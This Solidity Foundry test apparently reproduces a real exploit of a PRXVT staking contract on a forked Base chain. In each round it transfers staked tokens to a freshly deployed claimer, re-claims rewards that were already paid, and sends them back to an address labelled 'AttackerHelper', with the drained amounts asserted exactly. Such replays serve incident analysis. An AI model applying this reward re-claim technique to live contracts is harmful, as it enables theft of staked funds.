// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

interface IPRXVTStaking is IERC20 {
    function claimReward() external;
    function previewClaim(address user) external view returns (uint256 reward, uint256 burned, uint256 net);
    function totalBurned() external view returns (uint256);
}

contract ReplayClaimer {
    function claimAndReturn(address staking_, address rewardToken_, address helper_) external {
        IPRXVTStaking staking = IPRXVTStaking(staking_);
        IERC20 rewardToken = IERC20(rewardToken_);

        staking.claimReward();
        staking.transfer(helper_, staking.balanceOf(address(this)));
        rewardToken.transfer(helper_, rewardToken.balanceOf(address(this)));
    }
}

contract PRXVTStakingTransferReplayTest is Test {
    IPRXVTStaking internal constant STAKING = IPRXVTStaking(0xDAc30a5e2612206E2756836Ed6764EC5817e6Fff);
    IERC20 internal constant PRXVT = IERC20(0xC2FF2E5aa9023b1bb688178a4a547212f4614bc0);

    address internal constant HELPER = 0x702980b1Ed754C214B79192a4D7c39106f19BcE9;
    address internal constant BURN_ADDRESS = 0x000000000000000000000000000000000000dEaD;

    uint256 internal constant FIRST_EXPLOIT_BLOCK_BEFORE = 40_230_106;
    uint256 internal constant FIRST_EXPLOIT_TIMESTAMP = 1_767_249_561;
    uint256 internal constant FIRST_PRINCIPAL = 40_000 ether;
    uint256 internal constant FIRST_ITERATIONS = 11;
    uint256 internal constant FIRST_NET_PER_ROUND = 178_988_489_719_468_848_000;
    uint256 internal constant FIRST_BURN_PER_ROUND = 19_887_609_968_829_872_000;

    uint256 internal constant LARGE_EXPLOIT_BLOCK_BEFORE = 40_230_827;
    uint256 internal constant LARGE_EXPLOIT_TIMESTAMP = 1_767_251_003;
    uint256 internal constant LARGE_PRINCIPAL = 2_300_000 ether;
    uint256 internal constant LARGE_ITERATIONS = 20;
    uint256 internal constant LARGE_NET_PER_ROUND = 10_338_296_972_495_607_360_000;
    uint256 internal constant LARGE_BURN_PER_ROUND = 1_148_699_663_610_623_040_000;

    function setUp() public {
        vm.label(address(STAKING), "PRXVTStaking");
        vm.label(address(PRXVT), "PRXVT");
        vm.label(HELPER, "AttackerHelper");
        vm.label(BURN_ADDRESS, "BurnAddress");
    }

    function test_replayMatchesFirstObservedLoop() public {
        _selectBaseFork(FIRST_EXPLOIT_BLOCK_BEFORE);
        vm.warp(FIRST_EXPLOIT_TIMESTAMP);

        assertEq(STAKING.balanceOf(HELPER), FIRST_PRINCIPAL, "helper should hold the 40k stPRXVT stake");

        _runReplay(FIRST_PRINCIPAL, FIRST_ITERATIONS, FIRST_NET_PER_ROUND, FIRST_BURN_PER_ROUND);
    }

    function test_replayMatchesSuppliedLargeTransaction() public {
        _selectBaseFork(LARGE_EXPLOIT_BLOCK_BEFORE);
        vm.warp(LARGE_EXPLOIT_TIMESTAMP);

        assertGe(STAKING.balanceOf(HELPER), LARGE_PRINCIPAL, "helper should hold at least 2.3M stPRXVT");

        _runReplay(LARGE_PRINCIPAL, LARGE_ITERATIONS, LARGE_NET_PER_ROUND, LARGE_BURN_PER_ROUND);
    }

    function _runReplay(
        uint256 principal,
        uint256 iterations,
        uint256 expectedNetPerRound,
        uint256 expectedBurnPerRound
    ) internal {
        emit log("=== PRXVT staking replay ===");
        emit log_named_uint("fork block", block.number);
        emit log_named_uint("timestamp", block.timestamp);
        emit log_named_uint("principal", principal);
        emit log_named_uint("iterations", iterations);
        emit log_named_uint("expected net per round", expectedNetPerRound);
        emit log_named_uint("expected burn per round", expectedBurnPerRound);

        uint256 helperReceiptBefore = STAKING.balanceOf(HELPER);
        uint256 helperRewardBefore = PRXVT.balanceOf(HELPER);
        uint256 totalBurnedBefore = STAKING.totalBurned();
        uint256 burnBalanceBefore = PRXVT.balanceOf(BURN_ADDRESS);

        emit log_named_uint("helper stPRXVT before", helperReceiptBefore);
        emit log_named_uint("helper PRXVT before", helperRewardBefore);
        emit log_named_uint("staking totalBurned before", totalBurnedBefore);
        emit log_named_uint("burn address PRXVT before", burnBalanceBefore);

        for (uint256 i; i < iterations; ++i) {
            // A fresh holder inherits no reward checkpoint, so transferred stPRXVT can re-claim past rewards.
            ReplayClaimer claimer = new ReplayClaimer();
            vm.label(address(claimer), string.concat("ReplayClaimer-", vm.toString(i)));

            vm.prank(HELPER);
            STAKING.transfer(address(claimer), principal);

            (uint256 reward, uint256 burned, uint256 net) = STAKING.previewClaim(address(claimer));
            emit log("---- replay round ----");
            emit log_named_uint("round", i + 1);
            emit log_named_address("claimer", address(claimer));
            emit log_named_uint("claimer stPRXVT after transfer", STAKING.balanceOf(address(claimer)));
            emit log_named_uint("preview reward", reward);
            emit log_named_uint("preview burned", burned);
            emit log_named_uint("preview net", net);
            assertEq(reward, net + burned, "reward accounting mismatch");
            assertEq(net, expectedNetPerRound, "unexpected net reward for fresh claimer");
            assertEq(burned, expectedBurnPerRound, "unexpected burn for fresh claimer");

            claimer.claimAndReturn(address(STAKING), address(PRXVT), HELPER);

            emit log_named_uint("helper stPRXVT after round", STAKING.balanceOf(HELPER));
            emit log_named_uint("helper PRXVT after round", PRXVT.balanceOf(HELPER));
            emit log_named_uint("staking totalBurned after round", STAKING.totalBurned());
            assertEq(STAKING.balanceOf(address(claimer)), 0, "claimer should return all stPRXVT");
            assertEq(PRXVT.balanceOf(address(claimer)), 0, "claimer should return all PRXVT");
        }

        emit log("=== replay summary ===");
        emit log_named_uint("helper stPRXVT after", STAKING.balanceOf(HELPER));
        emit log_named_uint("helper PRXVT delta", PRXVT.balanceOf(HELPER) - helperRewardBefore);
        emit log_named_uint("staking totalBurned delta", STAKING.totalBurned() - totalBurnedBefore);
        emit log_named_uint("burn address PRXVT delta", PRXVT.balanceOf(BURN_ADDRESS) - burnBalanceBefore);

        assertEq(STAKING.balanceOf(HELPER), helperReceiptBefore, "helper should keep the same stPRXVT principal");
        assertEq(
            PRXVT.balanceOf(HELPER) - helperRewardBefore,
            expectedNetPerRound * iterations,
            "helper reward delta mismatch"
        );
        assertEq(
            STAKING.totalBurned() - totalBurnedBefore,
            expectedBurnPerRound * iterations,
            "staking burn accumulator mismatch"
        );
        assertEq(
            PRXVT.balanceOf(BURN_ADDRESS) - burnBalanceBefore,
            expectedBurnPerRound * iterations,
            "burn address delta mismatch"
        );
    }

    function _selectBaseFork(uint256 blockNumber) internal {
        string memory rpcUrl;

        if (vm.envExists("BASE_RPC_URL")) {
            rpcUrl = vm.envString("BASE_RPC_URL");
        } else {
            try this._defaultBaseRpcUrl() returns (string memory defaultRpcUrl) {
                rpcUrl = defaultRpcUrl;
            } catch {
                revert("Set BASE_RPC_URL or configure a Foundry base RPC alias");
            }
        }

        vm.createSelectFork(rpcUrl, blockNumber);
    }

    function _defaultBaseRpcUrl() external view returns (string memory) {
        return vm.rpcUrl("base");
    }
}
